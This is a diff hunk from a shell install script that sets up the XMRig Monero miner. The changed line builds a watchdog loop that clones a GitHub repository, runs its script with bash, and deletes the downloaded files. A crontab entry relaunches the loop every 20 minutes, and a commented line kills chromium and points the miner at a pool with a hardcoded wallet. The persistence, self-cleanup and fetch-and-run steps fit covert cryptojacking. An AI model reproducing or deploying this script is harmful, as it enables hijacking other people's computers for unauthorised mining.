@@ -12,7 +12,7 @@ make
 cd .. 
 cd .. 
 #echo -e "pkill chromium\n./xmrig/build/xmrig --url pool.hashvault.pro:443 --user 46Rrucmkm7SKbQ5GnmySEgAzRoPMFCFjnZQfqTcwV9DFN8k4xwpxpFpGkBbd48Pk1obbM7GQctgZjW7gpTaRLWaD5t3o6UY --pass x --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14" > mine_start.py
-echo -e "while : ; do\n if pgrep -f xmrig; then\n  true\n else\n  git clone https://github.com/DhDread/dan_xmrig_install.git && /usr/bin/bash ~/dan_xmrig_install/mine_start &\n fi\n sleep 600\n rm -rfv ~/dan_xmrig_install\ndone" > check_mine
+echo -e "while : ; do\n if pgrep -f xmrig; then\n  true\n else\n  git clone https://github.com/DhDread/dan_xmrig_install.git && /usr/bin/bash ~/dan_xmrig_install/mine_start && rm -rfv ~/dan_xmrig_install && /usr/bin/bash mine_start & \n fi\n sleep 600\ndone" > check_mine
 #sudo chmod +x mine_start
 sudo chmod +x check_mine
 (crontab -l 2>/dev/null || true; echo "*/20 17-23 * * * /usr/bin/bash check_mine") | crontab - 
